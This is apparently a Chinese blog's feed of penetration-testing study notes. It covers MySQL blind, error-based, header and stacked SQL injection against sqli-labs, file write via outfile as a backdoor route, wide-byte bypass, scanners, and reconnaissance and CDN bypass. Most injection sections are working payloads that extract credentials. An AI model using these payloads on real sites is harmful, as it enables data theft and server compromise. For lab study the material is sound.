    <content type="text"><![CDATA[获取帮助manman cmd man -k keyword #搜索关键词（不知道具体命令） man -k 'list directory contents' # 多个关键字 # 每个命令的 手册页 可以使用数字编号引用片段（section） man 5 passwd #（ 按section查看） - 1： 用户命令 - 2： 系统调用 - 3： 高级Unix编程库文档（程序员常用） - 4： 设备借口和驱动信息（很少使用） - 5： 文件描述（系统配置文件） - 6： Games - 7： 文件格式，惯例，编码(ASCII等) - 8： 系统命令和服务器 infoGUN不太喜欢慢，因此开发了info有时候优于man，有时不是info ls /usr/share/doc # 部分软件包没有列入man或者info的文档 cmd –help / -h绝大部分的不成文规定，并不都是，比如ls -h Shell输入与输出输出重定向ls a/ > file # 会覆盖 ls a >> file # 追加 head /proc/cpuinfo head < /proc/cpuinfo # 输入重定向 # `set -C` 之后不得覆盖 管道head /proc/cpuinfo | tar a-z A-Z ifconfig | grep inet | awk'{print $2}' | awk -F. '{print $2}' # -F 指定分隔符，这里以.分割 标准错误 stderr(报错包含重要信息)# 写脚本的时候有用，可以把错误信息报错到某个文件 ls /abc 2>e # 2:标准错误 1:标准输出 0:标准输入 ls 0&lt; a/ ls 1> file1 ls b 2> err1 ls a/ > f1 2>&amp;1 # 标准输出、标准错误都输出到文件f1 （&amp;1代表标准输出） 常见报错信息 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[07-mysql盲注]]></title>
    <url>%2Fposts%2F5241f069%2F</url>
    <content type="text"><![CDATA[SQL测试-基于 布尔,延时 盲注 场景：无回显，并且没有报错和其他显示能用布尔就不用延迟 几个相关函数：regexp regexp ‘^xiaodi[a-z]’ 匹配xiaodi及xiaodi…等if if(条件,5,0) 条件成立 返回5 反之 返回0sleep sleep(5) SQL语句延时执行5秒mid mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位substr substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度left left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位length length(database())=8，判断数据库database()名的长度ord=ascii ascii(x)=101，判断x的ascii码是否等于101，即email中的字母eIFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。CAST()和CONVERT()函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：CAST(value as type); CONVERT(value, type); 基于布尔(逻辑)盲注Less-5用burp批量跑0x01 获取数据库名操作Payload： left()获取数据库名长度值?id=1' and length(database())=8 %23 获取数据库名第一位值?id=1' and left(database(),1)='s' %23 等于?id=1' and left(database(),1)&gt;'a' %23 大于 获取数据库名第二位值?id=1' and left(database(),2) &gt; 'sa' %23?id=1' and left(database(),2) = 'se' %23 0x02 获取表名操作Payload： ascii(substr())获取表名第一个第一位的值（下面这个是获取表名中第一个表，的第二位的值）?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23获取表名第一个第二位的值?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=101 %23获取表名第二个第一位的值?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101 %23 用burp批量跑(最后一种模式，设置两个变量 limit $0, 1), $1,1))=115) 0x03 获取列名操作Payload： regxp获取列名regexp 查询users表第一个列名是否有us…列名?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+ 0x04 获取数据操作Payload： ord(mid())获取数据 security.users表中username列名的第一个第一位?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+(获取username中的第一行的第一个字符的ascii，与68进行比较) 基于延时盲注0x01 获取数据库名操作Payload： if(条件，成立返回值，不成立的返回值)获取数据库名第一个第一位?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+可以把sleep放外面：and sleep(if ‘x’=’yx, 5, 0) 0x02 获取表名操作Payload：获取列名第一个第一位?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),1)--+ 后续参考：https://www.cnblogs.com/xishaonian/p/6113965.html SQL二次注入测试案例测试：less-24 及实际举例25-30关卡好多是二次注入 自己练习 应用范围：我们注册一个用户后，然后进入用户中心，对应的url地址： xxx.php?user=xiaodi如果把注册的用户名改为: xx' union select 1,2,3 --总之: 将注入语句让web写入到数据库中，web在调用数据库中数据查询时，就触发了… 原理 mybatis以及预编译如何防止SQL注入 参考：https://www.cnblogs.com/haojun/p/10682407.html https://www.cnblogs.com/yangzailu/p/11381765.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[06-mysql类型报错注入]]></title>
    <url>%2Fposts%2F145e207%2F</url>
    <content type="text"><![CDATA[1. SQL各种参数类型下的注入测试 数字型-sqlilabs less2 x.php?id=1 字符型-sqlilabs less1 x.php?id=xiaodi 搜索型-自写测试 x.php?q=1 （select * from table where name like ‘%xi%’） 搞懂： 搞清楚为何要区分上面的类型数字的不带引号，字符型带符号，注意考虑干扰搜索型：模糊搜索计算机中搜索的通配符为*数据库中搜索的通配符为% 2. SQL各种报错方式下的注入测试 此类报错注入旨在解决无回显下的注入测试注：MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数 参考资料：https://www.wandouip.com/t5i158282/http://blog.sina.com.cn/s/blog_1450cc4c60102vraq.html floor报错sqlilabs less5 报错注入有长度限制，所以concat有时候不行， 需要limit 或者还需要subpayload: -- burp中注意空格问题（空格可以用+加号， 或者%20, 或者 /**/ 代替） ?id=1'+and+(select+1+from (select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+ ?id=-1' and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- + ?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2)))-- + http://192.168.0.121:8080/Less-5/?id=1%27 and (select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))) -- + -- 可以用burp批量跑 limit 0,1 的0这里。payload设置数字范围 updatexml报错sqlilabs less5updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数payload: ?id=1' and 1=(updatexml(1,concat(0x3a,(select version())),1))--+ ?id=1' and 1=(updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1))--+ http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e), 1) -- + http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select concat_ws(0x3a, username,password) from security.users limit 0,1),0x7e), 1) -- + extractvalue报错sqlilabs less5extractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数payload: id=1' and extractvalue(1,concat(0x7e,user()))--+ ?id=1' and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1)))--+ 3.SQL各种查询方式下的注入测试 select insert（注册，用户添加，发布文章） Less-18 $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"; -- sql语句 ??? 对吗没验证，截图了 insert into users(username, passwd) values('x' or updatexml(1,concat(0x3a,( version() ),1) or ' ', 'psd'); --payload User-Agent: 中 x' or updatexml(1,concat(0x7e,(version())),1) or ' User-Agent: x' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1)),1) or ' 自己练习增,删,改： updatexml和extra两个都实验 delete（后台删除文章, 用户…） update （改密码，数据同步）通过以上查询方式与网站一个用的关系，可以由注入点产生的地方或者应用猜测到对方的SQL查询方式 环境搭建 自己搭建 利用上述报错注入语句进行查询模式注入测试 create database newdb; use newdb; create table users ( id int(3) not null auto_increment, username varchar(20) not null, passowrd varchar(20) not null, primary key(id) ); insert into users values(1,'janes','Eyre'); 注意使用场景，在什么情况下用到 插件：mysql监控-Seay代码审计系统 查看执行了哪些语句 报错注入有长度限制:32位, 如果长度超出会显示不全.解决方案: substr((),1,1) 递进截取依次 (select substr(concat(username,0x3a,password), 1,10) from users limit 0,1) 三种查询方式对应的报错注入测试floor报错演示Payload insert into users(id,username,passowrd) values(1,'Olivia' or (select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x; ) or '','Nervo'); update users set passowrd='Nicky' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '' where id=2; delete from users where id=1 or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) updatexml报错演示Payload insert into users(id,username,passowrd) values(2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or '','Nervo'); update user set passowrd='Nicky' or updatexml(1,concat(0x7e,(version())),0) or '' where id=2 and username='Nervo'; delete from users where id=2 or updatexml(1,concat(0x7e,(version())),0) or ''; extractvalue报错演示Payload insert into users(id,username,password) values(2,'Olivia' or extractvalue(1,concat(0x7e,database())) or '','Nervo'); update users set passowrd='Nicky' or extractvalue(1,concat(0x7e,database())) or ''; delete from users where id=1 or extractvalue(1,concat(0x7e,database())) or ''; 参考：https://www.cnblogs.com/babers/articles/7252401.html Notes: delete，insert，update语句存在sql注入，扫描工具常规扫描不能获取到（没有权限，前提要登录状态下/登录后按钮的点击事件工具里面不能自动点击）， 所以：只能手工注入 比如场景： 注册/会员中心/删除文章/更新编辑文章 –&gt;抓包：数据包地址+id参数 ： 手工测试 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[05-mysql提交方式注入]]></title>
    <url>%2Fposts%2F462247e6%2F</url>
    <content type="text"><![CDATA[常见提交方式下的注入漏洞 前言：WEB应用在数据传递接受中，针对SQL注入安全漏洞，由于数据大小，格式等原因，脚本在接受传递时会有多种传递方式，传递方式的不同将影响到安全测试的不同！本课将针对此类问题进行逐一讲解。 第一点：数据常见提交方式https://www.cnblogs.com/weibanggang/p/9454581.html 第二点：产生注入的接受方式例子：GETPOST：COOKIE ：REQUEST ： $_REQUEST() 何种方法都可以接参数SERVER： http头部注入。$_SERVER https://www.cnblogs.com/jianmingyuan/p/5900064.html等 第三点：实战测试案例-sqlilabs关卡post登陆框注入-sqlilabs less13涉及知识点: 万能密码 Less-13 无回显Less-11 有回显 -- 一般是没有括号的，先手工，再工具试试有没有其他符号干扰 -- 可以用hackbar等进行post参数注入 -- 方法1 ')or 1=1 -- + -- 然后开始按照步骤开始利用 （盲猜 order by 3, 库名，表，列，数据） admin') union select null,database()# -- 这里面没回显数据的 地方，想办法让他报错/工具跑 -- sqlmap post参数是 --data "" -- 下面的没成功， 可以再试试 admin') union select count(*), concat(select database()) as admin from information_schema.tables group by admin\ -- 报错注入 admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))# +加号类似空格 http头部注入-sqlilabs less18$_SERVER() 比如站长之家获取我的浏览器的数据，其中http头部可以修改（你懂得） cookie修改注入-sqlilabs less20无回显 -- 大概是这样 User-Agent: admin' or updatexml(1,concat(0x7e,database(),0x7e),0) or ' document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[04-mysql注入]]></title>
    <url>%2Fposts%2F1f29cfad%2F</url>
    <content type="text"><![CDATA[靶场下载地址：https://github.com/Audi-1/sqli-labs mysql数据库分层1.库名，表名，列名，数据库用户等 2.数据库与WEB应用相结合的架构关系 Mysql数据库 数据库A zblog = www.zblog.com 表名 列名 数据 数据库B dede = www.dede.com 表名 列名 数据 PS： 数据库A及B都属于Mysql数据库里面的 数据库用户：管理数据库的用户 级别：管理员用户root 普通用户随机 自带数据库：mysql数据库自带的 mysql注入权限问题 普通用户 （只能靠猜数据进行安全测试） root用户 查询参数： user() database() version() // 查询数据库版本 @@version_compile_os // 操作系统版本 跨库注入 场景: 要渗透B， B没有漏洞，但是A有注入漏洞 -- 1.获取所有的数据库name -- select group_concat(schema_name) from information_schema.schemata; http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata) 2. 再选取某个数据库下面的表 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') 3. 根据表查列 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security') 4. 查数据 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from security.users) -- 或者 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 3,1) -- 或者 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from security.users) sqlLabs 1 -7 练习 MYSQL高权限注入mysql跨库注入-已讲 mysql文件操作注入-sqlilabs less7 -- null http://192.168.0.106/Less-7/?id=1')) union select null,null,null --+ --win的路径的话，加2个斜杠防止转义 -- 写入（aaa可以换成后门代码,txt可以换php） （高版本，失败：需要数据库开启secure_file_priv，如果可以执行命令，可以绕过：下来自己查） http://192.168.0.106/Less-7/?id=1')) union select 'aaa',null,null into outfile '/var/www/html/Less-7/test.txt' --+ -- 自己查资料？？？？？？？？？？ -- 读取文件 http://192.168.0.106/Less-7/?id=1')) union select null,null,load_file('/var/www/html/Less-7/test.txt') --+ -- 路径问题：需要提前得到网站完整路径 -- 路径获取方法： 1.报错显示 inurl:php warning 2.遗留文件 phpinfo()的 server_root。 script_filename 3.漏洞爆路径 discuzz爆路径 4.其他 读取(配合load_file)网站解析配置文件 字典盲猜测fuz： MYSQL过滤型注入mysql宽字节绕过注入-sqlilabs less32 宽字节注入条件：数据库编码为GBK等非中文 原理：%5c是反斜杠/ , 而 %df%5c 是一个繁体字（我不会读），所以单引号成功逃逸 $id=check_addslashes($_GET['id']); # 在你输入单引号的时候，自动加\转义 魔术引号： magic_quote_gpc (php.ini配置文件中), 打开之后，会转义单引号双引号 ------ 和上面的过滤函数有区别 【方法】： %df" %df' http://192.168.0.106/Less-32/?id=-1%df%27 union select 1,2,3 -- + 其他方法，自己查阅：？？？？？？？？？？ 列举几个常用的URL转码的字符 空格 %20 单引号 %27 # %23 \ %5C 在PHP中，通过iconv()进行编码转换时，也可能存在宽字节注入漏洞 MYSQL其他注入加密编码注入 -sqlilabs less21 (post注入)先加密，再填写inurl:MQ= 了解主流加密/编码规律 base64注入攻击程序代码中使用base64_decode($_GET('id')) 对参数进行解码 对 id' 进行base64编码后为 MSc= ，而%3d是=的url编码， 拼接为 `MCs=%3d` 后尝试； 1 and 1=1 的base64编码为 ，1 and 1=2 的base64编码为 ， 分别放到id=的后门尝试， 结果如果不同，则存在漏洞 继续使用order by 继续 ` 其他利用场景：过waf， 绕过检测 堆叠查询注入堆叠查询可以执行多条sql语句，多语句之间使用分号隔开，在第二个sql语句中构造自己要执行的语句 例如： ';select if(substr(user(),1,1)='r', sleep(5),1) -- + -- 一般只会返回第一条sql的执行结果 http://192.168.0.121:8080/Less-9/?id=1%27; select if(left(user(),4)='root',sleep(5), 0); -- + -- 所以，在第二条语句中，可以私用update更新数据或者时间盲注获取数据 XFF注入x-Forwarded-For， 代表客户端真实的ip， 修改后可以伪造客户端ip将xff头改为:127.0.0.1访问，如果返回正常，分别设置为127.0.0.1' and 1=1# 和127.0.0.1' and 1=2#再次访问 ，根据返回结构判断有没有漏洞继续使用order by， 而后使用union 127.0.0.1' union select 1,2,3# php中的getenv()函数用于获取一个环境变量的值 ，如果不存在返回false 下次课继续… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[03-漏洞发现]]></title>
    <url>%2Fposts%2Fcbce3690%2F</url>
    <content type="text"><![CDATA[基于WEB应用扫描测试被动式扫描 x-ray （长亭科技开发的） https://xray.cool/xray/#/tutorial/introduce Github: https://github.com/chaitin/xray/releases （国外速度快）网盘: https://yunpan.360.cn/surl_y3Gu6cugi8u （国内速度快） 主动式扫描 ：工具： awvs（可以录制填写账号密码）、 netsparker、 appscan(特别占用电脑资源) 注意验证后扫描 无验证码：模拟登陆 比如 awvs（可以录制填写账号密码） 有验证码：带入cookie 比如 awvs（桌面版：扫描option-&gt;cookie。网页版：custom cookie, 把网页数据包赋值过来） 抓app数据包的差异导致问题：awvs(custome header的添加；旧版：header and cookie) 基于操作系统扫描测试Nessus Openvas Goby 基于NMAP使用扫描测试https://blog.csdn.net/qq_29277155/article/details/50977143 其他安全漏洞扫描补充未授权访问 中间件安全 逻辑越权问题 更多安全扫描见：https://www.uedbox.com/tools/type/scanner/ 注意：部分漏洞（越权）利用工具无法探针，只能手工 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[02-漏洞分类]]></title>
    <url>%2Fposts%2Fe6239764%2F</url>
    <content type="text"><![CDATA[1.了解有那些漏洞名称？sql注入，文件上传，xss跨站，代码执行，命令执行，任意下载，目录遍历，文件泄漏，文件包含，逻辑越权，缓冲区溢出等 2.了解漏洞的产生层面？web应用，系统层面，第三方软件（数据库,中间件） 告诉大家一个道理： 在web应用或app等其他应用提供服务的同时，其中提供服务的所有对象（如搭建平台，数据库，网站程序，服务器操作系统，用到第三方管理软件等）均存在漏洞的可能性。 3.了解漏洞的影响范围？如：注入 有的可以进行文件操作 有的只能获取数据 上传 直接通过上传漏洞成功上传控制后门 告诉大家一个道理： 在做安全测试的时候，测试的目的是否可以根据当前发现的漏洞实现（每个漏洞能造成的危害都不一样，有大有小。） 4.了解目前主流的漏洞？5.了解漏洞的发现挖掘？黑盒测试：没源码 其他情况不知道的测试白盒测试：代码审计 源码挖掘漏洞 FUZZ 软件测试 工具： Awvs：web应用一块的 Nmap：全能型的 细分不够 Appscan: web应用一块的 nessus：操作系统一块的-第三方软件：通过 【端口】 或【 服务 】探针到使用到某些第三方软件，如weblogic或hfs，可以再通过【 漏洞平台 】或 【搜索引擎】 寻找指定漏洞。exploit-db， seebug等 一些web工具： https://www.uedbox.com/tools/type/webapp/ 6.了解漏洞的利用形式？手工操作 工具或脚本实现 编译利用代码实现（二次开发） 漏洞发现问题：1.登录 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[01-信息搜集]]></title>
    <url>%2Fposts%2Fa90b3e98%2F</url>
    <content type="text"><![CDATA[一些web工具： https://www.uedbox.com/tools/type/webapp 1.收集域名信息Whois查询在线工具： 爱站网 站长之家 VirusTotal 备案信息查询 ICP备案查询网 天眼查 2.收集敏感信息Google hacking常用语法：site:inurl:intext:filetype:intitle:link:info:cache: 缓存 比如：site:edu.cn intext:后台管理 还可以用它来搜集 后台，数据库文件，SQL注入，配置信息，源代码泄露，未授权访问，robots.txt等敏感信息 百度，必应，Yandex, 雅虎，Shodan等类似 3.收集子域名信息子域名检测工具工具： Layer子域名挖掘机 (推荐) K8 wydomain Sublist3r (推荐， 能列出多种资源) dnsmaper subDomainsBrute (推荐，python开发的， 可以使用小字典递归地发现三四五级域名) Maltego CE …… 搜索引擎枚举比如：搜索百度下面的子域名site:baidu.com 第三方聚合应用枚举很多第三方服务汇聚了大量DNS数据集， 可以通过他们检索某个给定域名的子域名 工具： DNSdumpster 网站 在线DNS侦查和搜索的工具来挖掘制定域潜藏的大量子域 证书透明度(CT)公开日志枚举是证书授权机构(CA)的一个项目， CA会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名、邮件地址 … … 方法：最简单的就是： 使用搜索引擎搜索一些公开的CT日志推荐： crt.sh: https://crt.sh 网站 https://censys.io 网站 其他工具：一些在线网站 子域名爆破网站： https://phpinfo.me/domain IP反查绑定域名网站： https://dns.zizhan.com 4. 收集常用端口信息 方便对症下药 工具： Nmap 无状态扫描工具 Masscan ZMap 御剑高速TCP端口扫描工具 https://www.cnblogs.com/botoo/p/10475402.html 常用端口和攻击方向汇总：文件共享服务端口 端口号 端口说明 攻击方向 20/21/69 Ftp/Tftp文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 2049 Nfs服务 配置不当 139 Samba 爆破、未授权访问、远程代码执行 389 Ldap目录访问权限 注入、允许匿名访问、弱口令 注：FTP协议的 21端口 –&gt; 传输控制信息， 20端口 —&gt; 传输数据 远程连接服务端口 端口 端口说明 攻击方向 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Rdp远程桌面连接 Shift后门（需Windows Server 2003 及以下系统 ）、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere 抓密码、代码执行 Web应用服务端口 端口号 端口说明 攻击方向 80/443/8080 常见的web服务端口 Web攻击、爆破、对于服务器版本漏洞 7001/ 7002 WebLogic控制台 Java反序列化、弱口令 8080/8089 JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令 9090 WebSphere控制台 Java反序列化、弱口令 4848 GlassFish 控制台 弱口令 1352 Lotus domino邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 数据库服务端口 端口号 端口说明 攻击方向 3306 Mysql 注入、提权、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹Shell 5432 PostgreSQL数据库 爆破、注入、弱口令 28017/27018 MongoDB 爆破、未授权访问 6379 Redis数据库 可尝试未授权访问、弱口令爆破 5000 SysBase/DB2数据库 爆破、注入 邮件服务端口 端口 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3协议 爆破、嗅探 142 IMAP协议 爆破 网络常见协议端口 端口 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67/68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、搜集目标内网信息 特殊服务端口 端口 端口说明 攻击方向 2181 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200 Elasticsearch服务 远程执行 11211 Memcache服务 未授权访问 512/513/514 Linux Rexec服务 爆破、Rlogin登录 873 Rsync服务 匿名访问、文件上传 3690 Svn服务 Svn泄露、未授权访问 50000 SAP Mannagement Console 远程执行1 5.指纹识别应用程序在html, css, js 等文件中多多少少会包含一些特征码（比如: WordPress在robots.txt中会包含wp-admin, 首页index.php中会包含generator=wordpress 3.xx）,帮助快速识别CMS 常见的CMS(整站系统)： Dedecms(织梦) Discuz PHPWEB PHPCMS ECShop Dvbbs SiteWeaver ASPCMS 帝国 Z-Blog WordPress 工具： 御剑Web指纹识别 What Web WEBrOBO 椰树 轻量WEB指纹识别 … 在线网站工具： BugScaner： https://whatweb.bugscaner.com/look/ 云悉指纹： https://www.yunsee.cn/finnger.html What Web: https://whatweb.net/ 推荐项目：https://github.com/Lucifer1993/cmsprint 国内的https://github.com/anouarbensaad/vulnx 国外的https://github.com/Lucifer1993/AngelSword 国内的 （停止维护） phpStudy搭建的网站，数据包都有以下特点Server: Apache/2.4.23 (Win32) OpenSSL/1.0.23 mod_fcgid/2.3.9 6.查找真实IP如果目标服务器只有一个域名 ，获取真实ip就非常重要如果没有CDN，可以通过 www.ip138.com等工具获取目标的ip CDN（内容分发网络， 通俗讲就是高速缓存服务器，把内容缓存到了距离我们最近的节点服务器上面…） 判断有无CDN采用超级ping第三方平台判断：唯一IP无cdn，反之有cdn或者采用在线网站17CE (https://www17ce.com)进行全国多地区的ping服务器操作 工具： 超级ping 站长工具等 绕过CDN寻找真实IP（1）内部邮箱源一般邮件系统都在内部，没有经过CDN解析通过网站注册用户或者RSS订阅功能，查看邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获取真实ip注意：必须是目标自己的邮件服务器，第三方公共邮件服务器不行 （2）扫描网站测试文件如：phpinfo, test等一文件，从而找到真实ip （3）分站域名很多主站访问量大，挂了CDN，但是分站有可能没有CDN可以通过ping二级域名获取分站ip， 很可能出现分站和主站部署同一个ip，但是在同一个C段下面的情况，从而判断目标的真实ip段 （4）国外访问较小或者业务面向国内的网站的CDN往往只对国内的用户访问加速，而国外就不一定了方法： 可以通过挂国外的代理 或者 使用国外的在线代理网站App Synthetic Monitor (https://asm.ca.com/en/ping.php)访问可能会得到真实ip （5）查询域名解析记录也许目标很久之前没有使用CDN通过网站NETCRAFT （https://www.netcraft.com/）来观察域名的ip历史记录，也可以大致分析出真实ip段 （6）目标有自己的App可以尝试用Fiddller或Burp Suite 抓取App的请求，从而找到目标的真实ip （7）绕过CloudFlare CDN查找真实IP很多网站都使用 CloudFlare 提供的cdn服务可通过在线网站FlareWatch (http://www.crimeflare.us/cfs.html#box) 对CloudFlare客户网站进行真实ip查询 (9) 其他方法其他方法：遗留文件（比如google镜像），扫全网(比如)，黑暗引擎，dns历史记录（第三方平台，刚好开通cdn之前的ip地址），以量打量（需要肉鸡，cdn的流量用完就显示真实ip） https://get-site-ip.com/ 遗留文件中: phpinfo的server_ddr字段， http_x_forwarded_for 【文章：】 https://www.lstazl.com/cdn检测与绕过/ https://www.fujieace.com/penetration-test/cdn-find-ip.html （8）验证获取的IP 是否真实？如果是Web： 直接输入ip访问，看看相应页面是否和访问域名返回的一样目标段比较大的情况下：借助Masscan的工具批扫描对应IP段中所有开了80,443,8080端口的ip，然后逐个ip尝试，观察响应结果是否是目标站点 7.收集敏感目录 文件从中可以发现隐藏的后台管理页面，文件上传页面，甚至网站备份文件和源码 工具： DirBuster java编写的，图形化界面 御剑后台扫描珍藏版 wwwscan Spinder.py (轻量级快速单目录后台扫描) Sensitivefilescan (轻量级快速单文件目录后台扫描 ) Weakfilescan (轻量级快速单文件目录后台扫描 ) awvs 爬行 webPathBrute robots.txt 很多在线工具： WebScan (http://www.webscan.cc/) 8.社会工程学邮件社工库…… 9. 其他 web信息搜集网站源码脚本类型php, java, python, go, node.js, …… 脚本类型： url直接显示: xxx.php 可以直接判断2.如果是伪静态：多构造请求数据包，f12，network中的数据包中，可以看到请求的URL(…xxx.jsp)或者接口…比如：Request URL: http://www.cngis.cn/news/detail.aspx?classid=216454257090494464&amp;id=140 这里是aspx的 伪静态怎么注入没理解？？？伪静态 不是真正意义上的静态格式文件 : 展示的格式是…xxx.html测试方法： f12打开network，查看请求数据包（） 多提交地址访问抓包分析 网站对应数据库常用的组合匹配： 如php程序 判定mysql aspx 判定mssql常见组合： asp+access php+mysql aspx+mssql jsp+mssql或oracle等 端口扫描判定：内网服务器方法失效access无端口开发， mysql:3306， mssql:1433， oracle:1521，MongoDB：27017,Postgresql:5432, redis:6379等 参考文章：https://www.cnblogs.com/botoo/p/10475402.html 网站搭建平台查看元素或审查元素抓包获取比如Server: Nginx, iis等中间件信息 服务器操作系统大小写判断 windows大小写不敏感 linux相反 有无WAF防护工具：可以借用 wafw000f 脚本判断waf类别。 https://github.com/EnableSecurity/wafw00f wafw00f 